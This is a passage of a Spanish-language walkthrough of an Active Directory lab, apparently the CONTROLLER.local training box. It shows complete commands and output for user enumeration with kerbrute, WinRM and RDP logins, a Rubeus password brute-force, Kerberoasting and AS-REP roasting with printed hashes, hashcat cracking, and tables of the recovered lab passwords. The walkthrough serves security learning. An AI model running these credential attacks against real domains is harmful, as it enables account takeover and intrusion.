+SMB<span class="w">         </span><span class="m">10</span>.201.29.113<span class="w">   </span><span class="m">445</span><span class="w">    </span>CONTROLLER-1<span class="w">     </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Windows<span class="w"> </span><span class="m">10</span><span class="w"> </span>/<span class="w"> </span>Server<span class="w"> </span><span class="m">2019</span><span class="w"> </span>Build<span class="w"> </span><span class="m">17763</span><span class="w"> </span>x64<span class="w"> </span><span class="o">(</span>name:CONTROLLER-1<span class="o">)</span><span class="w"> </span><span class="o">(</span>domain:CONTROLLER.local<span class="o">)</span><span class="w"> </span><span class="o">(</span>signing:True<span class="o">)</span><span class="w"> </span><span class="o">(</span>SMBv1:False<span class="o">)</span><span class="w"> </span>
+
+nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.201.29.113<span class="w"> </span>--generate-hosts-file<span class="w"> </span>name_hosts
+SMB<span class="w">         </span><span class="m">10</span>.201.29.113<span class="w">   </span><span class="m">445</span><span class="w">    </span>CONTROLLER-1<span class="w">     </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Windows<span class="w"> </span><span class="m">10</span><span class="w"> </span>/<span class="w"> </span>Server<span class="w"> </span><span class="m">2019</span><span class="w"> </span>Build<span class="w"> </span><span class="m">17763</span><span class="w"> </span>x64<span class="w"> </span><span class="o">(</span>name:CONTROLLER-1<span class="o">)</span><span class="w"> </span><span class="o">(</span>domain:CONTROLLER.local<span class="o">)</span><span class="w"> </span><span class="o">(</span>signing:True<span class="o">)</span><span class="w"> </span><span class="o">(</span>SMBv1:False<span class="o">)</span><span class="w"> </span>
+
+cat<span class="w"> </span>name_hosts<span class="w"> </span>
+<span class="m">10</span>.201.29.113<span class="w">     </span>CONTROLLER-1.CONTROLLER.local<span class="w"> </span>CONTROLLER.local<span class="w"> </span>CONTROLLER-1
+</code></pre></div>
+<p>Descargamos la lista de usuarios que nos entregaron.</p>
+<div class="highlight"><pre><span></span><code><span class="w"> </span>curl<span class="w"> </span>https://raw.githubusercontent.com/Cryilllic/Active-Directory-Wordlists/refs/heads/master/User.txt<span class="w"> </span>&gt;<span class="w"> </span>users.txt
+<span class="w"> </span><span class="sb">```</span>
+
+
+<span class="c1">###  kerbrute</span>
+
+Buscamos<span class="w"> </span>nombre<span class="w"> </span>de<span class="w"> </span>usuarios<span class="w"> </span>válidos
+
+<span class="sb">```</span>bash
+kerbrute<span class="w"> </span>userenum<span class="w"> </span>-d<span class="w"> </span>CONTROLLER.local<span class="w"> </span>--dc<span class="w"> </span><span class="m">10</span>.201.29.113<span class="w"> </span>users.txt<span class="w"> </span>
+
+<span class="w">    </span>__<span class="w">             </span>__<span class="w">               </span>__<span class="w">     </span>
+<span class="w">   </span>/<span class="w"> </span>/_____<span class="w">  </span>_____/<span class="w"> </span>/_<span class="w">  </span>_______<span class="w">  </span>__/<span class="w"> </span>/____<span class="w"> </span>
+<span class="w">  </span>/<span class="w"> </span>//_/<span class="w"> </span>_<span class="w"> </span><span class="se">\/</span><span class="w"> </span>___/<span class="w"> </span>__<span class="w"> </span><span class="se">\/</span><span class="w"> </span>___/<span class="w"> </span>/<span class="w"> </span>/<span class="w"> </span>/<span class="w"> </span>__/<span class="w"> </span>_<span class="w"> </span><span class="se">\</span>
+<span class="w"> </span>/<span class="w"> </span>,&lt;<span class="w"> </span>/<span class="w">  </span>__/<span class="w"> </span>/<span class="w">  </span>/<span class="w"> </span>/_/<span class="w"> </span>/<span class="w"> </span>/<span class="w">  </span>/<span class="w"> </span>/_/<span class="w"> </span>/<span class="w"> </span>/_/<span class="w">  </span>__/
+/_/<span class="p">|</span>_<span class="p">|</span><span class="se">\_</span>__/_/<span class="w">  </span>/_.___/_/<span class="w">   </span><span class="se">\_</span>_,_/<span class="se">\_</span>_/<span class="se">\_</span>__/<span class="w">                                        </span>
+
+Version:<span class="w"> </span>v1.0.3<span class="w"> </span><span class="o">(</span>9dad6e1<span class="o">)</span><span class="w"> </span>-<span class="w"> </span><span class="m">10</span>/05/25<span class="w"> </span>-<span class="w"> </span>Ronnie<span class="w"> </span>Flathers<span class="w"> </span>@ropnop
+
+<span class="m">2025</span>/10/05<span class="w"> </span><span class="m">18</span>:23:49<span class="w"> </span>&gt;<span class="w">  </span>Using<span class="w"> </span>KDC<span class="o">(</span>s<span class="o">)</span>:
+<span class="m">2025</span>/10/05<span class="w"> </span><span class="m">18</span>:23:49<span class="w"> </span>&gt;<span class="w">   </span><span class="m">10</span>.201.29.113:88
+
+<span class="m">2025</span>/10/05<span class="w"> </span><span class="m">18</span>:23:50<span class="w"> </span>&gt;<span class="w">  </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>VALID<span class="w"> </span>USERNAME:<span class="w">  </span>administrator@CONTROLLER.local
+<span class="m">2025</span>/10/05<span class="w"> </span><span class="m">18</span>:23:50<span class="w"> </span>&gt;<span class="w">  </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>VALID<span class="w"> </span>USERNAME:<span class="w">  </span>admin2@CONTROLLER.local
+<span class="m">2025</span>/10/05<span class="w"> </span><span class="m">18</span>:23:50<span class="w"> </span>&gt;<span class="w">  </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>VALID<span class="w"> </span>USERNAME:<span class="w">  </span>admin1@CONTROLLER.local
+<span class="m">2025</span>/10/05<span class="w"> </span><span class="m">18</span>:23:52<span class="w"> </span>&gt;<span class="w">  </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>VALID<span class="w"> </span>USERNAME:<span class="w">  </span>machine1@CONTROLLER.local
+<span class="m">2025</span>/10/05<span class="w"> </span><span class="m">18</span>:23:52<span class="w"> </span>&gt;<span class="w">  </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>VALID<span class="w"> </span>USERNAME:<span class="w">  </span>httpservice@CONTROLLER.local
+<span class="m">2025</span>/10/05<span class="w"> </span><span class="m">18</span>:23:52<span class="w"> </span>&gt;<span class="w">  </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>VALID<span class="w"> </span>USERNAME:<span class="w">  </span>machine2@CONTROLLER.local
+<span class="m">2025</span>/10/05<span class="w"> </span><span class="m">18</span>:23:52<span class="w"> </span>&gt;<span class="w">  </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>VALID<span class="w"> </span>USERNAME:<span class="w">  </span>user3@CONTROLLER.local
+<span class="m">2025</span>/10/05<span class="w"> </span><span class="m">18</span>:23:52<span class="w"> </span>&gt;<span class="w">  </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>VALID<span class="w"> </span>USERNAME:<span class="w">  </span>sqlservice@CONTROLLER.local
+<span class="m">2025</span>/10/05<span class="w"> </span><span class="m">18</span>:23:52<span class="w"> </span>&gt;<span class="w">  </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>VALID<span class="w"> </span>USERNAME:<span class="w">  </span>user2@CONTROLLER.local
+<span class="m">2025</span>/10/05<span class="w"> </span><span class="m">18</span>:23:52<span class="w"> </span>&gt;<span class="w">  </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>VALID<span class="w"> </span>USERNAME:<span class="w">  </span>user1@CONTROLLER.local
+<span class="m">2025</span>/10/05<span class="w"> </span><span class="m">18</span>:23:52<span class="w"> </span>&gt;<span class="w">  </span>Done!<span class="w"> </span>Tested<span class="w"> </span><span class="m">100</span><span class="w"> </span>usernames<span class="w"> </span><span class="o">(</span><span class="m">10</span><span class="w"> </span>valid<span class="o">)</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m">3</span>.058<span class="w"> </span>seconds
+</code></pre></div>
+<p>Usuarios encontrados</p>
+<div class="highlight"><pre><span></span><code>cat<span class="w"> </span>domian_users.txt<span class="w"> </span><span class="p">|</span><span class="w"> </span>awk<span class="w"> </span><span class="s1">&#39;{print $ 7}&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>sed<span class="w"> </span><span class="s1">&#39;s/@CONTROLLER\.local//g&#39;</span>
+administrator
+admin2
+admin1
+machine1
+httpservice
+machine2
+user3
+sqlservice
+user2
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>cat<span class="w"> </span>credential.txt<span class="w"> </span>
+Administrator<span class="w"> </span>/<span class="w"> </span>P@<span class="nv">$$</span>W0rd
+</code></pre></div>
+<p>Conexión por evil-winrm</p>
+<div class="highlight"><pre><span></span><code>evil-winrm<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;administrator&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;P@$$W0rd&#39;</span><span class="w"> </span>-i<span class="w"> </span><span class="m">10</span>.201.29.113<span class="w">   </span>
+
+*Evil-WinRM*<span class="w"> </span>PS<span class="w"> </span>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt;<span class="w"> </span>whoami
+controller<span class="se">\a</span>dministrator
+</code></pre></div>
+<h3 id="rubeus">Rubeus<a class="headerlink" href="#rubeus" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><span class="p">*</span><span class="n">Evil-WinRM</span><span class="p">*</span> <span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">Administrator</span><span class="p">\</span><span class="n">Downloads</span><span class="p">&gt;</span> <span class="p">.\</span><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">harvest</span> <span class="p">/</span><span class="n">interval</span><span class="p">:</span><span class="n">30</span>
+</code></pre></div>
+<p><img alt="alt text" src="image.png" /></p>
+<p>Agregamos el dominio al hosts de windows</p>
+<div class="highlight"><pre><span></span><code><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;10.201.29.113 CONTROLLER.local&#39;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\d</span>rivers<span class="se">\e</span>tc<span class="se">\h</span>osts
+
+<span class="nb">type</span><span class="w"> </span>C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\d</span>rivers<span class="se">\e</span>tc<span class="se">\h</span>osts
+<span class="m">10</span>.201.29.113<span class="w"> </span>CONTROLLER.local
+</code></pre></div>
+<p>Nos conectamos por RDP.</p>
+<div class="highlight"><pre><span></span><code>xfreerdp<span class="w"> </span>/u:Administrator<span class="w"> </span>/p:<span class="s1">&#39;P@$$W0rd&#39;</span><span class="w"> </span>/v:10.201.29.113<span class="w"> </span>/d:CONTROLLER.local<span class="w"> </span>/cert-ignore<span class="w"> </span>/dynamic-resolution<span class="w"> </span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><span class="p">.\</span><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">brute</span> <span class="p">/</span><span class="n">password</span><span class="p">:</span><span class="n">Password1</span> <span class="p">/</span><span class="n">noticket</span>
+
+   <span class="n">______</span>        <span class="n">_</span>
+  <span class="p">(</span><span class="n">_____</span> <span class="p">\</span>      <span class="p">|</span> <span class="p">|</span>
+   <span class="n">_____</span><span class="p">)</span> <span class="p">)</span><span class="n">_</span>   <span class="n">_</span><span class="p">|</span> <span class="p">|</span><span class="n">__</span>  <span class="n">_____</span> <span class="n">_</span>   <span class="n">_</span>  <span class="n">___</span>
+  <span class="p">|</span>  <span class="n">__</span>  <span class="p">/|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span>  <span class="n">_</span> <span class="p">\|</span> <span class="n">___</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|/</span><span class="n">___</span><span class="p">)</span>
+  <span class="p">|</span> <span class="p">|</span>  <span class="p">\</span> <span class="p">\|</span> <span class="p">|</span><span class="n">_</span><span class="p">|</span> <span class="p">|</span> <span class="p">|</span><span class="n">_</span><span class="p">)</span> <span class="p">)</span> <span class="n">____</span><span class="p">|</span> <span class="p">|</span><span class="n">_</span><span class="p">|</span> <span class="p">|</span><span class="n">___</span> <span class="p">|</span>
+  <span class="p">|</span><span class="n">_</span><span class="p">|</span>   <span class="p">|</span><span class="n">_</span><span class="p">|</span><span class="n">____</span><span class="p">/|</span><span class="n">____</span><span class="p">/|</span><span class="n">_____</span><span class="p">)</span><span class="n">____</span><span class="p">/(</span><span class="n">___</span><span class="p">/</span>
+
+  <span class="n">v1</span><span class="p">.</span><span class="n">5</span><span class="p">.</span><span class="n">0</span>
+
+<span class="p">[-]</span> <span class="n">Blocked</span><span class="p">/</span><span class="n">Disabled</span> <span class="n">user</span> <span class="p">=&gt;</span> <span class="n">Guest</span>
+<span class="p">[-]</span> <span class="n">Blocked</span><span class="p">/</span><span class="n">Disabled</span> <span class="n">user</span> <span class="p">=&gt;</span> <span class="n">krbtgt</span>
+<span class="p">[+]</span> <span class="n">STUPENDOUS</span> <span class="p">=&gt;</span> <span class="n">Machine1</span><span class="p">:</span><span class="n">Password1</span>
+<span class="p">[*]</span> <span class="n">base64</span><span class="p">(</span><span class="n">Machine1</span><span class="p">.</span><span class="n">kirbi</span><span class="p">):</span>
+
+      <span class="n">doIFWjCCBVagAwIBBaEDAgEWooIEUzCCBE9hggRLMIIER6ADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyi</span>
+      <span class="n">JTAjoAMCAQKhHDAaGwZrcmJ0Z3QbEENPTlRST0xMRVIubG9jYWyjggQDMIID</span><span class="p">/</span><span class="n">6ADAgESoQMCAQKiggPx</span>
+      <span class="n">BIID7btpEEDZNpUAXL8igHQVHUgxEntJfYFU</span><span class="p">/</span><span class="n">z</span><span class="p">+</span><span class="n">mKD7Q3JaqDC8M3bUMGRX4sA</span><span class="p">+</span><span class="n">gMjlRk65RVUDxCdIq</span>
+      <span class="n">PpS2s67GUXDWczjakmJ7FHEuqVaftKZITtBWi40FP</span><span class="p">/</span><span class="n">X7sNwA3m3FBXfFVcTSNcMQP52XFX2hsiZqjj68</span>
+      <span class="n">36OeLV6FZrKNta</span><span class="p">+</span><span class="n">5cKhsV3aYGP56z7WHQ8iNS8i0Xcny8PC8CglIN9Os4f7D3Tp7vT</span><span class="p">/</span><span class="n">FpRxfEp1JN7Yq</span>
+      <span class="n">pRbiDXpFHrG8</span><span class="p">+</span><span class="n">Rd362QqkQxv2lDRPQJsDLe9zh</span><span class="p">+</span><span class="n">0R3C53zFxNESSoaNNP</span><span class="p">/</span><span class="n">CgN</span><span class="p">+</span><span class="n">lyRoEtpOjXjjKYurmd</span>
+      <span class="n">XwDMedhAetNa3nHpvyhFJPP6D4KnRC8GC1OGgGvXYXI7sJZHhZnUZCkhvMhptP2Hp4</span><span class="p">/</span><span class="n">9lUva</span><span class="p">+</span><span class="n">huYNyK7</span>
+      <span class="n">jCkmcZPrA</span><span class="p">/</span><span class="n">bC30Gjv35ejsyKuI3V3YmghVMcOzQMe3aVJIXpxisv4P5rNNIpPBT4WFqOHyFJS4Fg84ha</span>
+      <span class="n">IidYnPRiQbJSa</span><span class="p">/</span><span class="n">d9Uv7qD6wum6R8fQ4S6ZggkViOm9NNRFc7Apbc</span><span class="p">/</span><span class="n">js</span><span class="p">+</span><span class="n">WtKPo57HO4Hdka73pPaip</span><span class="p">+</span><span class="n">wo</span>
+      <span class="n">la0rKc5H2jFDqlbpQENH0V9uHHFoz0</span><span class="p">+</span><span class="n">TaSpIu</span><span class="p">+</span><span class="n">MSGjRSnYR47Ind46fwAtRwNA3cX</span><span class="p">+</span><span class="n">FhwDD2Dr</span><span class="p">/</span><span class="n">JdF2R</span>
+      <span class="n">kVgNwKXWzODcc3A22NCpGiqyagQDREQ</span><span class="p">/</span><span class="n">34GVa</span><span class="p">+</span><span class="n">jF</span><span class="p">+</span><span class="n">OYNaqdaXyQ3e8AEnRJldMNfkpbTGAM1mBrtipej</span>
+      <span class="n">1LasyQS6DdXEwcC6GXR6d</span><span class="p">/</span><span class="n">eEbApAYSlKt7Xasy</span><span class="p">/</span><span class="n">wNI7uY9qlX4CCuSOYvbh1UeMeuYvDrOBHAPMLB1w4</span>
+      <span class="n">zCSRsbWK9GyQT0lXF6IDpFGZSdE1WMhm5Rn9kpq</span><span class="p">+</span><span class="n">rF30XjJ</span><span class="p">/</span><span class="n">DjGJ0ECprwY5GmgNmxngrM3412ZCQTMx</span>
+      <span class="n">v8fQQB1stgfd8qr1t7T8142</span><span class="p">+</span><span class="n">Vwh72v7A8hzCn1nxUQsjHo3cCzUzbza</span><span class="p">/</span><span class="n">jAnxsJfDVGQBuDsz9jVR7LoB</span>
+      <span class="n">OPxg8a0m1</span><span class="p">/</span><span class="n">R06fFtPCiHjT857Xhz4n</span><span class="p">+</span><span class="n">SaNRHRv7QjFNCq7cdlLnEZdwgFowDssubYD</span><span class="p">/</span><span class="n">jWtGnYSUOFNYS</span>
+      <span class="n">sbSk53L8iPURtJZ4mTAelz</span><span class="p">/</span><span class="n">rhSdJUediGKjmKCw4JKFbJMFoXHK0vPu7Kwbft34UrbgHwEROSTKlL0vB</span>
+      <span class="n">PYkPFoOAbOkH7TwGoztrsT4boNV9uPOamf</span><span class="p">++</span><span class="n">CZZyJV6TnbKh3pHRedY1CjFjxfK7WQzi7duL8kj2W9gq</span>
+      <span class="n">wp8GqQZCPmY5BDh5YZhjVZn8PtrCOM2p2TSPgqUkIxAMT5SpU22gaewvVmXMsy4rJgisEaMYjcIcAgKB</span>
+      <span class="n">IaDZwBIDDnMweUgmG2wDJYx5YnUiorX866jLFAgGk7IeAaxTHiNZ2CSDJwSrll7MXqOB8jCB76ADAgEA</span>
+      <span class="n">ooHnBIHkfYHhMIHeoIHbMIHYMIHVoCswKaADAgESoSIEIAI5pjGVKypcNWXITJ4GS3dnEGn9Vpxt1</span><span class="p">+</span><span class="n">Ci</span>
+      <span class="n">DRzqIXJ</span><span class="p">+</span><span class="n">oRIbEENPTlRST0xMRVIuTE9DQUyiFTAToAMCAQGhDDAKGwhNYWNoaW5lMaMHAwUAQOEAAKUR</span>
+      <span class="n">GA8yMDI1MTAwNTIxNTA1OVqmERgPMjAyNTEwMDYwNzUwNTlapxEYDzIwMjUxMDEyMjE1MDU5WqgSGxBD</span>
+      <span class="n">T05UUk9MTEVSLkxPQ0FMqSUwI6ADAgECoRwwGhsGa3JidGd0GxBDT05UUk9MTEVSLmxvY2Fs</span>
+
+<span class="p">[+]</span> <span class="n">Done</span>
+</code></pre></div>
+<h3 id="kerberoasting-w-rubeus-impacket">Kerberoasting w/ Rubeus &amp; Impacket<a class="headerlink" href="#kerberoasting-w-rubeus-impacket" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><span class="p">.\</span><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">kerberoast</span>
+</code></pre></div>
+<p><img alt="alt text" src="image-1.png" /></p>
+<p>Guardamos el Hash generado con Rubeus.</p>
+<div class="highlight"><pre><span></span><code>cat<span class="w"> </span>hash.txt<span class="w">      </span>
+<span class="nv">$krb5tgs$23$*</span>SQLService<span class="nv">$CONTROLLER</span>.local<span class="nv">$CONTROLLER</span>-1/SQLService.CONTROLLER.local:30111*<span class="nv">$07</span>D083365FB5F970FC297F75B6A3988C<span class="nv">$256</span>F5D89FBD0318A76869C3159EA83D5903EB35FEE8E1958D6E518523A40152C1A90C816D43B266647DE4E5CF152BB4AE5F20DD46A3C12E7F8FE5E15B3954CC8DA55392505C5C99B68D6E6A01D5CB8385D58B483456848855162360A367454E9C9FB2A9551A92F17DB99BC00D9333508880D4ED834736F2122D2B82361DFD1BC175F34748124C7DE122B1D5CF0EFCB0E3E11839DEC1650AB4F4A126339DA99C035EC711543B76C903924CE65EE481361083956CBB9D651FF24DE4D95D017F9E6D4350F77FAB7EDD2D4B3B446952AA9E95DA6C001A9D0D3C503BC918A1245DF65B3A85E1CD4D43E5978AD4F23CC973894F267997404B24510CAA243AEC52A4DBFCF22B45E11472B3479C7AB909695F6168892DEEF0E5F86C002A81CC52745192C3827302982EFB91429CF11D683D223B82F300050C80CBF5C1C5497DA30371BDDEE821C8858C39B31C016D8E7D469258FF9C5E665452B78E62B671404350A937A3A72E3E5D5D009BD2D3741AF9CA9D37D952E45D83F96E749FBCFAB9C161ACC3F4A6428019F353F19C00E272933277EB3EA120ACED5844D097361ACBBF3C335E64D059E09801D1CF674E90E7EF8152B519C27AA3D6F47BCBE987D65251C22736833734C89F0826B1867717A5DBCB3CF52B2A30C5D0440DB5CCDC5EAD000D0FBB2F9B67F69293B93D07D5F0D5449658BBFD2968A9C664EFE058464B4B1CF98D53327E7B0138C08F1DD22DD04C2EF5DA42F4F86CC13C95CEB417C199A033E46DBA190D8852C30D239DC6D2780A6F284E7586490C6B054C23296F3DF660CA522D05F404394ADCBB69D65E363D148EF77B7C3DF0AB812458F499266C81C3A9458B39C19F3CB1343257EF90FF9937F0AAFD43EC44331D07DD379FAD69BAA2E9EF177FFC0D61AD0C833C4E324D211562C1B3D8BC15580BF3D2D568FF544D0F9B6615F822B70935E4131E3DC702DC21AE234D6A205C911C18D0F42DCEE2D1FDB0C337B87111E79E4AFA0276C6F4C3C086E3329660C8231BC487D821A841E871C9B4557C024AF1365B5B9D9D89E55796B6C91010AF697BA6CB1A315A444D23EF21E82EC076E7C0E56727448EF96896C8786C2904711DA468A8DD6977706D104FB8C4105428D5BCB7F39DA564260776C18200FCA08469ED0982645950CADA4B1F41F149726DE647ED25F8160439AF039739A1411C8C48507A76029C6EBC22C0ECE50E6C4CF97C9448660692ECBA0D8876462A6BBBAD8306B9492B1DD59651C769C8FBEA0E483954487A0135C2AC793D4D4D14A798030B32C659427189A4C60E32191893FCEBB2C350F683CAE8702C29800A2992A0B06570AC442530C5990D97FF982B4AB57CB2746EDF1938AD443844056FA517613BB2F374CFF986782BE6B9F84091EF85CB7D53A37BCEA7C5693D036A8EF86FE2450AC0756FD7EE450D1C047BF88BF3E2846DE0AE2A54B13F38FA4A858A8C77857735873F1B3357AB0B63F205AC99453F74517E26F7DA6BCA8D39CF4F12000BEE1B38F05CC1BD5FA018D68649CEB42E26AABDA82E8AEDF3718EF20A4961C5CCCC0CC4A07BB15B04D85F554D5F37E6DA71355AD11B78D49DC884322193E833ACAF555F56FFD6D017D904F9C69E07AE9951FBA1A7ACB8B6B38776E5D57FE00D0C2D5
+</code></pre></div>
+<p>Descargamos la lista de passwords que nos entregaron.</p>
+<div class="highlight"><pre><span></span><code>curl<span class="w"> </span>https://raw.githubusercontent.com/Cryilllic/Active-Directory-Wordlists/refs/heads/master/Pass.txt<span class="w"> </span>&gt;<span class="w"> </span>passwords.txt
+</code></pre></div>
+<p>Crack de contraseñas</p>
+<div class="highlight"><pre><span></span><code>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">13100</span><span class="w"> </span>-a<span class="w"> </span><span class="m">0</span><span class="w"> </span>hash.txt<span class="w">  </span>passwords.txt
+</code></pre></div>
+<p><img alt="alt text" src="image-2.png" /></p>
+<p>Agregamos nuestra nueva contraseña </p>
+<table>
+<thead>
+<tr>
+<th>User</th>
+<th>Password</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>SQLService</td>
+<td>MYPassword123#</td>
+</tr>
+</tbody>
+</table>
+<div class="highlight"><pre><span></span><code>cat<span class="w"> </span>hash_http_service.txt<span class="w"> </span>
+<span class="nv">$krb5tgs$23$*</span>HTTPService<span class="nv">$CONTROLLER</span>.local<span class="nv">$CONTROLLER</span>-1HTTPService.CONTROLLER.local:30222*<span class="nv">$1472</span>C79BAA8A22CFE8E5C7FFA1DD6FFD<span class="nv">$38</span>BE781DDDCEB46953DD3A649DD55B580B3EA222E2ED7D8BDE0ED879971A14416F3C2F4EEA564E4AEADBA6E56BECE39FC191691703D0C144A1ACB7A3EAD2762F3E3CB51946A42C5063794A9E2C4FE2C30C32C10319A466420DB31F00557E3595468FF5ADBECD8DB82CF90644C535D9188C952315F124416E913BF7FE6E0745ECC33D682D758FE6E24E03D20AAE74AD3165766C155CB6047A8A40362F680926CE97EBD2D679C91A9AE1AA22E4D411C07B156CA260052EEBFBFF31A592AC37E281354FC08632FBED6832A281244EF632B7602F2B456F88FBDE7BF69F8DA61550404A17D4487C9F653EF3C3DE4BF1E91C5E8D321DC4FBFEA2512E0B222F0078CAF1780DFDB85C19E57922862BAA7E119EE19BE1434AAE5E69A703A8268F1F58D34960CC5005063B59A226172B5E2074DA0179D1BD4CCEEAC4ECC73A6F620201E2C8296DDB95B1E610053E6B1EDB90715689E082CD920F54A8E642F57EAB97FC98FA5567DFE3C606BD4918CE522C5FF8C76D256FA8EBDA1F74A86A7539E1B91B5EB0FE235CA36B46A774B39BF58685A74DEF82564BB0B137E1114E8B192D3B4645C962B28D7ADD6D1764206A0C1C7D132F4B513FB3C9C6EE5D17F336CDCC0ECCE98DFE6DE46C851BC5F26E693FC54455DE26EF519827CA135486A07188E756767736C7E430A6BC196307AB2791D3285029D2B2D534580FB9F2BF0931498A3DDD8897D8E679144FA14B677A8DEF3E04ECF76EC7575FEE88341D7A7B725079CAAE4EC4C64821832A8222FCB3C0FBF649813AB84E3202DF0C3FD1C65DF60FBF4B1EF0EA0810C3A12E58C31FB75F312FF691D5E52ADE53B49247029048021A1FE511431FF0908F5C5E432F2971B216A667DE7C53AB1B5FC28680FCD1C932940AC39D852D387A371E37373F62CEEDDE3F3CC72000336E5EF62FE6254946F69B65D6536C2ACAC586A19435AD42C4019329AB166735DCFB66E61F578797A393FD18275011FE8DECF12B7AA3EC384A0C5EC40225D15C11D3D407EFE210A03C5BE078CFB819814B1E908E83D8C79D0B84164A568258A01BCCA412595D8B3A87C5ACCB100422136942D77D1E217BD54097BE9F4E7B60217B39A764BBF368ECE66411D1B04E9DF530807ED93A52EB56A1535C083E11F15EA1717C1AEA465AC4645A10EE974BC1710524442C33CA60D46D8FDAB1B623AD80C07199B60DA3D56F49A55A7673CA498993100F3E7010540829087362872D5DE5B0E4D1849A57846269C84E343A9DB8BEC7B619F633AF1862C26ED346BF99EE1E760DD4C82ADE2383C3099C669BD8086F85C994C8E84668F13DCAE44715CDF1BA6F1BA233358FC621058FDCF9C9BF2B21BD33B1D661DEA4AC024E1757F3EDFB2BB94DDA857CFDC84D482508A02302AFE1309AAF9AFF17E83A836AC7D8AB03E71DF39CDF06A193EB66605B4CC8621978F61E942910F98450D8AE39A1A0D72D915A0097C7EE73C057C4270F1C84EDE9CF7D43511F3F8325D8372D5A791136B69DA05F181E4CE67C3B2CB38DC98B6928595D98E75099780ED0CC447126294F532A4D58446059470C714F337F7503EEB883A3990415B77495C147FAC54A7195B482EAF0DF80454E71FF7FCD32C577517157F8E54CAABB180EF2B4B03FF61A94FC2205
+</code></pre></div>
+<p>Crack del http service</p>
+<div class="highlight"><pre><span></span><code>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">13100</span><span class="w"> </span>-a<span class="w"> </span><span class="m">0</span><span class="w"> </span>hash_http_service.txt<span class="w"> </span>passwords.txt<span class="w"> </span>****
+</code></pre></div>
+<p><img alt="alt text" src="image-3.png" /></p>
+<table>
+<thead>
+<tr>
+<th>User</th>
+<th>Password</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Administrator</td>
+<td>P@$$W0rd</td>
+</tr>
+<tr>
+<td>SQLService</td>
+<td>MYPassword123#</td>
+</tr>
+<tr>
+<td>HTTPService</td>
+<td>Summer2020</td>
+</tr>
+</tbody>
+</table>
+<h3 id="as-rep-roasting-w-rubeus">AS-REP Roasting w/ Rubeus<a class="headerlink" href="#as-rep-roasting-w-rubeus" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><span class="p">.\</span><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">asreproast</span>
+</code></pre></div>
+<p><img alt="alt text" src="image-4.png" /></p>
+<p>Guardamos nuestros nuevos hash encontrados.</p>
+<div class="highlight"><pre><span></span><code>cat<span class="w"> </span>hash_admin2.txt<span class="w">      </span>
+<span class="nv">$krb5asrep$Admin2</span>@CONTROLLER.local:65670B034E85DC7A84C4CAC6DF16B351<span class="nv">$47</span>A82FD49F58E4183616252B083617B19B12AC28FDC2523B28A4CA2F77BEE1C526AB411DF8220B51DB2AEA207469FDDB2CE8F023CD62B7E48E62D0127A066A14D6C245EA551A10D74559F6F8013E00C95722D31EEDF44869EB2C47B65F060434233988B8763CD92F34134983492864A53F527A3252A2E7B662BA92D37A9675B8F7C7888FB3562507DA9F4C8FB5DFB4F7A137668841FD62BE22EAF4C182D27E12EB3D8828C64A5EFFB72798E4ED600E2F3BDDF08DFE2C8C2160284483E72591DF0D65CE8C108D4CB40A1D521820F46DF861D493115B95C0F744FE6FC31EEB2789645461385C6214354E39A9C47C7CB5AF82003E9E
+
+cat<span class="w"> </span>hash_user3.txt<span class="w"> </span>
+<span class="nv">$krb5asrep$User3</span>@CONTROLLER.local:6EDC19211E4862742A7AE6CAE88235BD<span class="nv">$483</span>DFE9B9D1FC04E2E4FD18EBB3419272EDF63A7A4CA0062831DFF8D2E948B2A468736722BC475E24002ED1D6F4CF24A78F0FBE48D29688E12CE5E23F41A9CF90C060E81AD20C39FAE5F572714CEB3C48BA6ACF344E858E30BD11F4F826EE26320645F459263200BC41B72E608EAFF504751AAD4DECD9B527F90F32518EFF3C64FA308A51A6E289A5B49BC57177025AD0C695A65D8CE3880B425E0FC5092C4DA47DA2604D3BBF9FDE1A4F4EDF4A33887016CEF88BA979A5B1B36A97FBA579915A83E1FDF64D0C847D4887CDEFE5896C3E61CD9657173DB553ACCB6437C56E674B66B429A8B709C04D2925DF559C5BD6BB6B0E5BF
+</code></pre></div>
+<p>Crack de los Hash</p>
